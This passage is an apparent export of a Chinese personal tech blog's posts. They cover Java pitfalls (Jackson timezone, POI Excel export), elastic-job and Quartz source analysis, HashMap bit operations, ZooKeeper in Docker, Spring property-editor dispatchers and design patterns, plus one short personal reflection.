单精度与双精度小数，比如2.2，在程序里面是十进制的数字，在计算机中是以2进制存储， 换算成十进制的值，却不会是2.2的。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"避坑指南","slug":"避坑指南","permalink":"http://www.hasfun.cn/tags/避坑指南/"}]},{"title":"关于@JsonFormat(pattern = \"yyyy-MM-dd HH:mm\") 时区差8小时的踩坑记录","slug":"jsonformat","date":"2019-07-30T07:59:11.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/30/jsonformat/","link":"","permalink":"http://www.hasfun.cn/2019/07/30/jsonformat/","excerpt":"","text":"今天遇到有个项目使用jackson的注解@JsonFormat，用于格式化时间输出，eg: @DateTimeFormat(pattern=&quot;yyyy-MM-dd HH:mm&quot;) @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm&quot;) public Date getProBidOpent() { return proBidOpent; } 然而上线后，才发现时间比用户录入的少了8个小时，查询源码发现，JsonFormat默认的时区是国际化本地，而不是东8时区（也就是北京时间），我们看下源码: @Target({ElementType.ANNOTATION_TYPE, ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @JacksonAnnotation public @interface JsonFormat{ ```` public final static String DEFAULT_TIMEZONE = &quot;##default&quot;; /** * @since 2.9 */ public Value(String p, Shape sh, String localeStr, String tzStr, Features f, Boolean lenient) { this(p, sh,(localeStr == null || localeStr.length() == 0 || DEFAULT_LOCALE.equals(localeStr)) ?null : new Locale(localeStr), (tzStr == null || tzStr.length() == 0 || DEFAULT_TIMEZONE.equals(tzStr)) ? null : tzStr, null, f, lenient); } } 默认时区是new Locale(localeStr)。默认转换时区为”GMT”，即格林尼治时间，北京时间是GMT+8 所以以后使用这个注解要注意避雷，eg： @DateTimeFormat(pattern=&quot;yyyy-MM-dd HH:mm&quot;) @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm&quot;,timezone=&quot;GMT+8&quot;) public Date getProBidOpent() { return proBidOpent; }","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"避坑指南","slug":"避坑指南","permalink":"http://www.hasfun.cn/tags/避坑指南/"}]},{"title":"如何用POI导出100W的数据到EXCEL","slug":"如何用POI导出100W的数据到EXCEL","date":"2019-07-24T12:13:21.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/24/如何用POI导出100W的数据到EXCEL/","link":"","permalink":"http://www.hasfun.cn/2019/07/24/如何用POI导出100W的数据到EXCEL/","excerpt":"","text":"POI导出EXCEL功能，是JAVA程序员入门的功能。一个同事问我，有没有什么好的性能高的方法，可以导出大数据量的Excel方法，据说他们公司之前的同事写的导出Excel，只有一万行记录，导致JVM直接OOM了，看来导出Excel这个功能，还是得重新梳理下，重视一下。 Google了一下，学习了一下excel各个版本，容纳的最大行数与列数还是不一样的。 早期的Office套件使用二进制格式，这里面包括以.doc、.xls、.ppt为后缀的文件；直到2007这个划时代的版本将基于XML的压缩格式作为默认文件格式，也就是相应以.docx、.xlsx、.pptx为后缀的文件 03版二进制Excel能支持的最大行数为65536,2007版本的是1048575。所以对于大数据量，建议使用xlsx格式。 做Excel的导出，POI就足够了，其他工具也是基于这个来开发的,比如easyExcel。然后操作大文件写入建议使用SXSSFWorkbook ，顺便提一句大文件写入使用基于SAX的 XSSFReader。 基于上述原理，我在网上找到了一个开源框架，经过试验，我试着导出100W的数据到Excel，只花了48s，效果很好，源码简单看了一下，就是一些基础的封装，调用SXSSWorkbook操作的Excel，源码如下： huto的EXCEL大文件导出。 当然，如果考虑到交互，用户体验好的话，还是避免让用户等待太久时间，建议如下： 页面发出导出请求，然后服务端收到请求后，异步处理导出，然后服务器将文件导出成功后上传到文件服务器，引导用户去文件服务器列表找。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"POI","slug":"POI","permalink":"http://www.hasfun.cn/tags/POI/"},{"name":"大数据","slug":"大数据","permalink":"http://www.hasfun.cn/tags/大数据/"}]},{"title":"elastic-job源码分析之JOB的作业运行过程","slug":"elastic-job源码分析之JOB的作业运行过程","date":"2019-07-21T00:33:55.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/21/elastic-job源码分析之JOB的作业运行过程/","link":"","permalink":"http://www.hasfun.cn/2019/07/21/elastic-job源码分析之JOB的作业运行过程/","excerpt":"","text":"上一篇分析了elastic-job与quartz怎么结合，启动作业。那么作业是怎么执行的呢？我猜想是quartz启动作业后，会起个线程，根据cron表达式的规则去执行作业，翻了一下源码验证一下，quartz使用JobRunShell运行作业： public void run() { ```省略``` OperableTrigger trigger = (OperableTrigger) jec.getTrigger(); JobDetail jobDetail = jec.getJobDetail(); ```省略``` job.execute(jec);// execute the job ````省略``` } 上面的代码，执行实现Job接口的类的execute方法： public interface Job { void execute(JobExecutionContext context) throws JobExecutionException; } 那么elastic-job实现Job接口实现liteJob,也就是说quartz执行的liteJob这个类： /** * Lite调度作业. * * @author zhangliang */ public final class LiteJob implements Job { @Setter private ElasticJob elasticJob; @Setter private JobFacade jobFacade; @Override public void execute(final JobExecutionContext context) throws JobExecutionException { JobExecutorFactory.getJobExecutor(elasticJob, jobFacade).execute(); } } 到此为止，就把quartz的JOB执行过程与elastic-job的作业联系到一起了。那么，litejob的elasticJob，jobFacade二个属性值是什么时候塞进去的呢?还是找源码，这里比较隐秘，回到quartz中JobRunShell的initialize（）方法： public void initialize(QuartzScheduler sched)throws SchedulerException { this.qs = sched; Job job = null; JobDetail jobDetail = firedTriggerBundle.getJobDetail(); try { job = sched.getJobFactory().newJob(firedTriggerBundle, scheduler);//初始化JOB } catch (SchedulerException se) { ··· } this.jec = new JobExecutionContextImpl(scheduler, firedTriggerBundle, job);//初始化JOB的一些上下文参数 } job = sched.getJobFactory().newJob(firedTriggerBundle, scheduler)这个方法获取jobFactory,这里使用的是PropertySettingJobFactory extend SimpleJobFacotry，再通过反射实例化了实现JOB接口的liteJob，看下是怎么实现的： public class PropertySettingJobFactory extends SimpleJobFactory { ... @Override public Job newJob(TriggerFiredBundle bundle, Scheduler scheduler) throws SchedulerException { Job job = super.newJob(bundle, scheduler);//反射实例化Job JobDataMap jobDataMap = new JobDataMap(); jobDataMap.putAll(scheduler.getContext()); jobDataMap.putAll(bundle.getJobDetail().getJobDataMap()); jobDataMap.putAll(bundle.getTrigger().getJobDataMap()); /** * 上面的LiteJob.class,其中有两个成员变量, * elasticJob和jobFacade就是这里来初始化的。 * 通过反射 */ setBeanProps(job, jobDataMap); return job; } public class SimpleJobFactory implements JobFactory { ... /** * 根据JobDetail中的JobClass类来生成一个实例。 */ public Job newJob(TriggerFiredBundle bundle, Scheduler Scheduler) throws SchedulerException { JobDetail jobDetail = bundle.getJobDetail(); Class&lt;? extends Job&gt; jobClass = jobDetail.getJobClass(); try { if(log.isDebugEnabled()) { log.debug( &quot;Producing instance of Job &#39;&quot; + jobDetail.getKey() + &quot;&#39;, class=&quot; + jobClass.getName()); } return jobClass.newInstance(); } catch (Exception e) { SchedulerException se = new SchedulerException( &quot;Problem instantiating class &#39;&quot; + jobDetail.getJobClass().getName() + &quot;&#39;&quot;, e); throw se; } } } liteJob.class是从jobDetail里面get的，上一节中，提到了作业启动过程中，JobScheduler中init（）调用了createJobDetail（）这个方法： private JobDetail createJobDetail(final String jobClass) { JobDetail result = JobBuilder.newJob(LiteJob.class).withIdentity(liteJobConfig.getJobName()).build();//告诉quartz的JOB类型是liteJob result.getJobDataMap().put(JOB_FACADE_DATA_MAP_KEY, jobFacade);//liteJob的属性值jobFacade初始化，put到jobDetail的jobdataMap Optional&lt;ElasticJob&gt; elasticJobInstance = createElasticJobInstance(); if (elasticJobInstance.isPresent()) { result.getJobDataMap().put(ELASTIC_JOB_DATA_MAP_KEY, elasticJobInstance.get());//liteJob的属性值elasticJob初始化，put到jobDetail的jobdataMap } else if (!jobClass.equals(ScriptJob.class.getCanonicalName())) { try { result.getJobDataMap().put(ELASTIC_JOB_DATA_MAP_KEY, Class.forName(jobClass).newInstance()); } catch (final ReflectiveOperationException ex) { throw new JobConfigurationException(&quot;Elastic-Job: Job class &#39;%s&#39; can not initialize.&quot;, jobClass); } } return result; } 至此，liteJob 什么时候初始化，以及他的属性jobFacade，elasticJob是什么地方set进去的，就清楚了。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"},{"name":"elastic-job","slug":"elastic-job","permalink":"http://www.hasfun.cn/tags/elastic-job/"}]},{"title":"elastic-job源码分析之JOB的作业启动过程","slug":"elastic-job源码分析之JOB的启动过程","date":"2019-07-20T15:12:31.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/20/elastic-job源码分析之JOB的启动过程/","link":"","permalink":"http://www.hasfun.cn/2019/07/20/elastic-job源码分析之JOB的启动过程/","excerpt":"","text":"elastic-job是由zk做分布式存储,结合quartz做的调度任务，下面我来找找是怎么跟quartz结合起来的？ 运行elastic-job提供的例子elastic-job-example，可以找到JOB的启动入口 public static void main(final String[] args) throws IOException { //第一步： 启动ZK CoordinatorRegistryCenter regCenter = setUpRegistryCenter(); //第二步： 作业数据库事件配置，用于记录JOB执行状态 JobEventConfiguration jobEventConfig = new JobEventRdbConfiguration(setUpEventTraceDataSource()); //第三步： 开启三种类型JOB setUpSimpleJob(regCenter, jobEventConfig); setUpDataflowJob(regCenter, jobEventConfig); setUpScriptJob(regCenter, jobEventConfig); } 接着上面，看setUpSimpleJob方法 private static void setUpSimpleJob(final CoordinatorRegistryCenter regCenter, final JobEventConfiguration jobEventConfig) { // JOB的核心配置初始化 JobCoreConfiguration coreConfig = JobCoreConfiguration.newBuilder(&quot;javaSimpleJob&quot;, &quot;0/5 * * * * ?&quot;, 3).shardingItemParameters(&quot;0=Beijing,1=Shanghai,2=Guangzhou&quot;).build(); // 执行JOB类型为SimpleJob SimpleJobConfiguration simpleJobConfig = new SimpleJobConfiguration(coreConfig, JavaSimpleJob.class.getCanonicalName()); // JOB调度器 启动JOB new JobScheduler(regCenter, LiteJobConfiguration.newBuilder(simpleJobConfig).build(), jobEventConfig).init(); } JobScheduler 是JOB调度器，执行init()启动JOB,如下 /** * 初始化作业. */ public void init() { LiteJobConfiguration liteJobConfigFromRegCenter = schedulerFacade.updateJobConfiguration(liteJobConfig); JobRegistry.getInstance().setCurrentShardingTotalCount(liteJobConfigFromRegCenter.getJobName(),liteJobConfigFromRegCenter.getTypeConfig().getCoreConfig().getShardingTotalCount()); JobScheduleController jobScheduleController = new JobScheduleController(createScheduler(),createJobDetail(liteJobConfigFromRegCenter.getTypeConfig().getJobClass()),liteJobConfigFromRegCenter.getJobName()); JobRegistry.getInstance().registerJob(liteJobConfigFromRegCenter.getJobName(), jobScheduleController, regCenter); // 选主 schedulerFacade.registerStartUpInfo(!liteJobConfigFromRegCenter.isDisabled()); // 启动quartz JOB执行作业 jobScheduleController.scheduleJob(liteJobConfigFromRegCenter.getTypeConfig().getCoreConfig().getCron()); } 上面代码里jobScheduleController的作用就是elastic-job操作quartz API的封装类。 /** * 调度作业. * * @param cron CRON表达式 */ public void scheduleJob(final String cron) { try { if (!scheduler.checkExists(jobDetail.getKey())) { scheduler.scheduleJob(jobDetail, createTrigger(cron)); } scheduler.start();//quartz的方法 } catch (final SchedulerException ex) { throw new JobSystemException(ex); } } 由此，elastic-job与quartz完美的结合起来的，其中createJobDetail(liteJobConfigFromRegCenter.getTypeConfig().getJobClass())，后面会谈到quartz怎么用到的，JobDetail是quartz的类。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"},{"name":"elastic-job","slug":"elastic-job","permalink":"http://www.hasfun.cn/tags/elastic-job/"}]},{"title":"elastic-job源码分析之位运算","slug":"elastic-job源码分析之位运算","date":"2019-07-20T10:20:11.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/20/elastic-job源码分析之位运算/","link":"","permalink":"http://www.hasfun.cn/2019/07/20/elastic-job源码分析之位运算/","excerpt":"","text":"最近在看elastic-job源码，每个技术点，都是自己的盲点，没办法进行下去了，先上第一个。 JobSettings类中： private Map&lt;String, String&gt; jobProperties = new LinkedHashMap&lt;&gt;(JobPropertiesEnum.values().length, 1); 看到这个声明map的方法，让我想起之前学的HashMap的源码，我们知道HashMap扩容性能比较差，所以声明Map的时候指定initialCapacity默认容量大小，这不足为奇，但是这里指定loadFactor加载因子为1（默认0.75），估计也是为了减少扩容的触发条件吧。elasticjob声明的容量大小为2，那么我开始理解的意思是，当jobProperties最多put 2个值就会触发HashMap的扩容，如果容量为10，则最多put 10个值就会触发…结果却大跌眼镜，我写了一个测试用例：public class MapTest { //创建hashmap设置默认大小，与加载因子，防止过度扩容 private static Map&lt;String, String&gt; jobProperties = new LinkedHashMap&lt;&gt;(10, 1); public static void main(String[] args) { for (int i=0 ;i&lt;11;i++){ jobProperties.put(&quot;test_&quot;+i,&quot;val_&quot;+i); } } dubug发现没有扩容；然后我翻了下源码，发现map里的扩容条件不是我想的那样。 //扩容触发的条件，Map的size&gt;threshold if (++size &gt; threshold) resize(); 继而找到了threshold的计算方法tableSizeFor，说这个之前，还是先温习下计算机的位运算 3 + 2 = 5 ，计算机转成二进制运算： 00000011 00000010 —————— 00000101 = 5 *************************************** 2*2 = 4，则 00000010 *2 —————— 00000100 = 4 2*4=8 00000010 *4 —————— 00001000 = 8 2*8=16 00000010 *8 —————— 01000000 = 16 通过上面运算可以总结一下规律： ab,当b满足2^N,则结果为a左移N位，22=2&lt;&lt;1,24=2&lt;&lt;2,28=2&lt;&lt;3那么当b不满足2^N的时候，编译器会将b转为多个满足2^N的数相加，即2313=23*(16+4+2+1)=23&lt;&lt;4+23&lt;&lt;2+23 减法类似加法，只是加的是个负值，除法与乘法相似，只是改成了右移。 有了如上基础，在看HashMap的tableSizeFor（）方法 /** * Returns a power of two size for the given target capacity. * 翻译一下：返回给定值的2次幂。 */ static final int tableSizeFor(int cap) { int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1; } 总结下tableSizeFor的功能（不考虑大于最大容量的情况）是返回大于输入参数且最近的2的整数次幂的数。比如10，则返回16。上面大牛写的位运算巧妙的实现了这样的运算，位运算属于计算机的运算语言，速度极快。那么上面的计算要怎么理解呢，还是举个例子，好理解：假如我初始化的容量cap=10，则 int n = cap-1=9,对应的二进制为： 0000 1001 =================== n |=n&gt;&gt;&gt;1，计算过程如下; 0000 1001 =n 0000 0100 =n&gt;&gt;&gt;1 —————————— 0000 1101 =n ==================== n |= n &gt;&gt;&gt; 2,计算过程如下; 0000 1101 =n 0000 0011 =n&gt;&gt;&gt;2 —————————— 0000 1111 =n ==================== n |= n &gt;&gt;&gt; 8,计算过程如下; 0000 1111 =n 0000 0000 =n&gt;&gt;&gt;8 —————————— 0000 1111 =n ===================== n |= n &gt;&gt;&gt; 16,计算过程跟上面一样。 最终n = 0000 1111 转成十进制就是15 最后函数中return n + 1；则返回的是16.而10的最小2的整数幂就是16。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"},{"name":"elastic-job","slug":"elastic-job","permalink":"http://www.hasfun.cn/tags/elastic-job/"}]},{"title":"elastic-job源码分析之概述","slug":"elastic-job源码分析之概述","date":"2019-07-20T10:19:11.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/20/elastic-job源码分析之概述/","link":"","permalink":"http://www.hasfun.cn/2019/07/20/elastic-job源码分析之概述/","excerpt":"","text":"我本身也没有读源码的习惯，读源码太乏味，也不容易理解，缺乏耐心，可能这也是我没有成为大牛的原因吧，既然认识到错误，那就现在开始养成吧。读源码是件痛苦的事情，所以我也和很多网友一样也会在网上查询关于读源码的方法，最终也没有找到和我契合的方法，那只能撸着袖子，先干起来，我决定在博客里面记录下，读源码的过程，方便以后查错纠正。 确认目标我读源码，更多的是想学习源码优秀的设计思想，与设计模式的运用，某个领域的设计模型。 选择一个与自己密切相关的开源项目现公司项目里面用到了elastic-job,我选择了这个与我联系密切的 [x] 认识elastic-job的架构与主要功能认识一下系统的架构，官方文档。 分布式调度协调 弹性扩容缩容 失效转移 错过执行作业重触发 作业分片一致性，保证同一分片在分布式环境中仅一个执行实例 自诊断并修复分布式不稳定造成的问题 支持并行调度 支持作业生命周期操作 丰富的作业类型 Spring整合以及命名空间提供 运维平台 从主功能入手分析 elastic-job源码分析之JOB的作业启动过程 elastic-job源码分析之JOB的作业执行过程 elastic-job源码分析之位运算) elastic-job的特性源码分析 如何分片？分片的算法是什么 怎么保证作业的高可用 怎么与zk配合，怎么防止注册中心与作业服务器的数据不一致性 与TBSchedule 比较 最后，预祝自己成功！","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"源码分析","slug":"源码分析","permalink":"http://www.hasfun.cn/tags/源码分析/"},{"name":"elastic-job","slug":"elastic-job","permalink":"http://www.hasfun.cn/tags/elastic-job/"}]},{"title":"此刻，我想说的","slug":"此刻，我想说的","date":"2019-07-15T18:20:32.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/16/此刻，我想说的/","link":"","permalink":"http://www.hasfun.cn/2019/07/16/此刻，我想说的/","excerpt":"","text":"入职新公司，一个月了。今晚，趁着加班的空闲，记录一下自己在这公司感受。今天听到了一个不好消息，刚混熟的跟我一样是新来这公司的，他因为“好心办坏事”要被开了，事情的缘由是他出于好学，将公司代码上传到GitHub，本想在家也可以学习代码，快速融入环境，结果被公司安全部门给检测到了。虽然与我无关，可是心里还是有点不是滋味。做程序员有6年了，如今仍在业务系统上来回折腾，无休止的赶需求，然后加班，做完一个接着一个。我感觉自己做着一个没有创造性的工作，像个loser，究竟什么是成功呢？或许30岁做上项目经理，是一种成功？又或者30岁年入40W，算一种成功？而，我在上海有一套房，背着房贷，有个三岁大的孩子，这算成功吗？成功的定义，或许如当年明月在《明朝那些事儿》里，以徐霞客的一生为例说的： 成功只有一个 按照自己的方式，去度过人生","categories":[{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"}],"tags":[{"name":"闲言杂语","slug":"闲言杂语","permalink":"http://www.hasfun.cn/tags/闲言杂语/"}]},{"title":"在docker下安装zookeeper","slug":"在docker下安装zookeeper","date":"2019-07-08T07:51:25.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/08/在docker下安装zookeeper/","link":"","permalink":"http://www.hasfun.cn/2019/07/08/在docker下安装zookeeper/","excerpt":"","text":"下载zk镜像docker pull zookeeper 启动容器docker run --name some-zookeeper -it -p 2181:2181 -p 2888:2888 -p 3888:3888 zookeeper # 2181 端口号时 zookeeper client 端口 # 2888端口号是zookeeper服务之间通信的端口 # 3888端口是zookeeper与其他应用程序通信的端口 # 使用 ZK 命令行客户端连接 ZK docker run -it --rm --link some-zookeeper:zookeeper zookeeper zkCli.sh -server zookeeper","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://www.hasfun.cn/tags/zookeeper/"}]},{"title":"自定义属性编辑器实现分发器在Spring和SpringBoot的不同实现方式","slug":"自定义属性编辑器实现分发器在Spring和SpringBoot的不同实现方式","date":"2019-07-05T04:34:37.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/05/自定义属性编辑器实现分发器在Spring和SpringBoot的不同实现方式/","link":"","permalink":"http://www.hasfun.cn/2019/07/05/自定义属性编辑器实现分发器在Spring和SpringBoot的不同实现方式/","excerpt":"","text":"最近在写一个项目，需要借助spring的自定义属性编辑器，实现一个分发器的功能，将踩过的坑记录下来，方便下次查阅。 为什么这里提到spring4+呢?customEditors在spring4.0以下的是Map类型，，key的类型必须是Class类型，而value是一个注入的bean；在spring4.0中，key和value的类型必须是Class类型，也就是说配置信息中的 customEditors 中的value值不能在是bean，而应该修改成class Spring4的自定义属性编辑器实现分发器 MatchBean public interface MatchingBean&lt;T&gt; { boolean matching(T factor); } FactoryList public interface FactoryList&lt;E extends MatchingBean&lt;K&gt;, K&gt; extends List&lt;E&gt; { E getBean(K factor); } FactoryArrayList public class FactoryArrayList&lt;E extends MatchingBean&lt;K&gt;, K&gt; extends ArrayList&lt;E&gt; implements FactoryList&lt;E, K&gt;, InitializingBean { private static final long serialVersionUID = 5705342394882249201L; public FactoryArrayList() { super(); } public FactoryArrayList(int size) { super(size); } public E getBean(K factor) { Iterator&lt;E&gt; itr = iterator(); while(itr.hasNext()) { E beanMatch = itr.next(); if(beanMatch.matching(factor)) { return beanMatch; } } return null; } public void afterPropertiesSet() throws Exception { if (!isEmpty()) { Object[] a = toArray(); OrderComparator.sort(a); ListIterator i = listIterator(); for (int j=0; j&lt;a.length; j++) { i.next(); i.set(a[j]); } } } } CustomEditorRegistrar public class CustomEditorRegistrar implements PropertyEditorRegistrar { private Map&lt;Class&lt;?&gt;, PropertyEditor&gt; customEditors; public void registerCustomEditors(PropertyEditorRegistry registry) { if (customEditors != null) { Set&lt;Map.Entry&lt;Class&lt;?&gt;, PropertyEditor&gt;&gt; entries = customEditors.entrySet(); for (Map.Entry&lt;Class&lt;?&gt;, PropertyEditor&gt; entry : entries) { registry.registerCustomEditor(entry.getKey(), entry.getValue()); } } } public void setCustomEditors(Map&lt;Class&lt;?&gt;, PropertyEditor&gt; customEditors) { this.customEditors = customEditors; } } 配置文件 &lt;bean class=&quot;org.springframework.beans.factory.config.CustomEditorConfigurer&quot;&gt; &lt;property name=&quot;customEditors&quot;&gt; &lt;map&gt; &lt;entry key=&quot;com.huangcw.utils.bean.FactoryList&quot;&gt; &lt;ref bean=&quot;factoryListEditor&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=&quot;factoryListEditor&quot; class=&quot;org.springframework.beans.propertyeditors.CustomCollectionEditor&quot;&gt; &lt;constructor-arg name=&quot;collectionType&quot; value=&quot;com.huangcw.utils.bean.FactoryArrayList&quot; type=&quot;java.lang.Class&quot;&gt;&lt;/constructor-arg&gt; &lt;/bean&gt; 调用 @Autowired private FactoryList&lt;IGiftReceiveService,Long&gt; giftReceiveServiceIntegerFactoryList; ActivityGiftReceviedCondition condition = ActivityGiftReceviedCondition.newBuilder() .giftId(Long.parseLong(giftId)) .num(num) .activityId(activityId)).build(); return Result.getResult(giftService.receiveGift(condition)); SpringBoot版思路就是 将上面的xml翻译为spring的注解方式即可，其他的matchBean,facotyList都跟上面一样，直接上源码： 自定义属性配置 @Configuration public class BeanConfig { @Bean public CustomCollectionEditor customCollectionEditor() { CustomCollectionEditor cce =new CustomCollectionEditor(FactoryArrayList.class); return cce; } @Bean public CustomEditorRegistrar customEditorRegistrar() { CustomEditorRegistrar cec =new CustomEditorRegistrar(); Map&lt;Class&lt;?&gt;, PropertyEditor&gt; map = new HashMap(); map.put(FactoryList.class,customCollectionEditor()); cec.setCustomEditors(map); return cec; } @Bean public CustomEditorConfigurer customEditorConfigurer(){ CustomEditorConfigurer cec = new CustomEditorConfigurer(); CustomEditorRegistrar[] propertyEditorRegistrars = new CustomEditorRegistrar[]{ customEditorRegistrar() }; cec.setPropertyEditorRegistrars(propertyEditorRegistrars); return cec; } } 继承MatchingBean的业务接口DispatchService public interface DispatchService extends MatchingBean&lt;String&gt; { } 实现DispatchService接口的类，重写matching匹配方法 @Service public class ADispatchServiceImpl implements DispatchService { @Override public boolean matching(String factor) { return &quot;A&quot;.equals(factor); } } 调用方式 @RestController public class DispatchController { @Resource private FactoryList&lt;DispatchService,String&gt; factoryDispatchList; @RequestMapping(&quot;/{a}/cancel/{params}&quot;) public String dispatch(@PathVariable(&quot;a&quot;) String airline, @PathVariable(&quot;params&quot;) String params){ String result = factoryDispatchList.getBean(a).cancel(params); return a+result; } } 这种设计方法，可以简单的实现转发器，我经常在项目里面使用，并且我的同事从前家公司离开之后，也很爱用这种方法,因为这样写是你的代码很整洁，也符合开闭原则，可扩展性强。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://www.hasfun.cn/tags/Spring/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://www.hasfun.cn/tags/SpringBoot/"}]},{"title":"结合Spring工程模式+策略模式+模板的项目应用","slug":"结合Spring工程模式-策略模式-模板的项目应用","date":"2019-07-05T03:04:18.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/07/05/结合Spring工程模式-策略模式-模板的项目应用/","link":"","permalink":"http://www.hasfun.cn/2019/07/05/结合Spring工程模式-策略模式-模板的项目应用/","excerpt":"","text":"市场提出需求，产品分析出业务模型，我们再根据业务模型，抽象出领域模型，设计类图与时序图，将共同的功能，利用设计模式设计低耦合，高内聚，易扩展的代码，在工作中，我经常用到的就是工程模式，模板模式，策略模式，比如我最近遇到的这样的场景，市场部时不时就变着法子做营销活动，每次的活动形式有略微的差别，总结出来，只有四部分功能：活动的查询，参加活动，领取奖品，奖品的计算。那么领域对象可以归纳为以下几种： 活动主体 活动分发器 活动规则 活动奖品 活动规则引擎 其中活动分发器为了应对以后需求的扩展，比如有抽奖活动，有进阶拿奖品的活动..,所以抽离出来用策略模式分发到不同的活动中是有必要的. 分发器 @Service public class DispatcherService implements IDispatcherService { @Autowired private FactoryList&lt;IActivityHandlerService,Integer&gt; factoryList; public &lt;T extends ActivityResponse&gt; ExecResult&lt;T&gt; joinAct(ContextParam contextParam) { long t1 = System.currentTimeMillis(); T response; String beanName = contextParam.getRequest().getClass().getName(); LogUtil.log(ActivityLoggerFactory.BUSINESS, ActivityLoggerMarker.BUSINESS, Level.INFO, &quot;执行&quot; + beanName + &quot;开始&quot; + &quot; &quot; + &quot;context:&quot; + JSON.toJSONString(contextParam)); try { response = factoryList.getBean(contextParam.getActivityType()).joinAct(contextParam); } catch (BusinessRuntimeException e) { LogUtil.log(ActivityLoggerFactory.EXCEPTION_HANDLER, ActivityLoggerMarker.BUSINESS, Level.ERROR, LogUtil.formatLog(KVJsonFormat.title(&quot;业务处理BusinessRuntimeException异常&quot;) .add(&quot;beanName&quot;, beanName) .add(&quot;context&quot;, contextParam) .add(&quot;errMsg&quot;, e.getMsg()))); return ExecResult.newInstance(e.getCode(), e.getMessage()); } catch (Exception e) { LogUtil.log(ActivityLoggerFactory.EXCEPTION_HANDLER, ActivityLoggerMarker.BUSINESS, Level.ERROR, LogUtil.formatLog(KVJsonFormat.title(&quot;系统Exception异常&quot;) .add(&quot;beanName&quot;, beanName) .add(&quot;context&quot;, contextParam)), e); return ExecResult.newInstance(ResultCodeEnum.SYSTEM_ERROR.getCode(), &quot;系统Exception异常&quot;); } catch (Throwable e) { LogUtil.log(ActivityLoggerFactory.EXCEPTION_HANDLER, ActivityLoggerMarker.BUSINESS, Level.ERROR, LogUtil.formatLog(KVJsonFormat.title(&quot;系统Throwable异常&quot;) .add(&quot;beanName&quot;, beanName) .add(&quot;context&quot;, contextParam)), e); return ExecResult.newInstance(ResultCodeEnum.SYSTEM_ERROR.getCode(), &quot;系统Throwable异常&quot;); } LogUtil.log(ActivityLoggerFactory.BUSINESS, ActivityLoggerMarker.BUSINESS, Level.INFO, &quot;执行&quot; + beanName + &quot;结束 time:&quot; + (System.currentTimeMillis() - t1) + &quot; context:&quot; + JSON.toJSONString(contextParam) + &quot;response:&quot; + JSON.toJSONString(response)); return ExecResult.getSuccesussResult(response); } } 上述代码中： @Autowired private FactoryList&lt;IActivityHandlerService,Integer&gt; factoryList; 这个是FactoryList利用spring的自定义属性编辑器实现的，防止篇幅太长，我还是放在下一篇吧。自定义属性编辑器实现分发器在Spring和SpringBoot的不同实现方式 所有的活动都有一些共性：像参加活动的规则校验，活动参加成功后执行的action。不同的活动，规则不一样，执行成功后要触发的动作也不一样，比较适合用模板模式。模板模式ActivityHandlerService @Override public &lt;T extends ActivityResponse&gt; T joinAct(ContextParam contextParam) { // 获取活动的特定解析器，获取规则列表 BaseActivityPartDTO activityDTO = (BaseActivityPartDTO) activityDTOParserFactory.getBean(contextParam.getActivityType()) .buildDTO(contextParam.getRequest()); contextParam.setActivityDTO(activityDTO); //校验活动规则 doRuleCheck(contextParam,activityDTO.getRules()); //校验通过，执行之后的活动逻辑 doAction(contextParam); //组装反馈结果 return (T) buildResponse(contextParam); } /** * 构造响应对象 * @param contextParam * @return */ private &lt;T extends ActivityResponse&gt; T buildResponse(ContextParam contextParam) { ActivityResponse activityResponse = activityDTOParserFactory.getBean(contextParam.getActivityType()).buildResponse(contextParam); if (activityResponse == null) { throw new BusinessRuntimeException(1, &quot;&quot;); } return (T) activityResponse; } /** * 活动规则检验 * * @param rules */ private void doRuleCheck(ContextParam contextParam, List&lt;Rule&gt; rules) { //没有规则直接返回 if (CollectionUtils.isEmpty(rules)) { return; } //检查参数 ExecResult&lt;List&lt;String&gt;&gt; paramCheck = activityRuleEngine.check(rules); 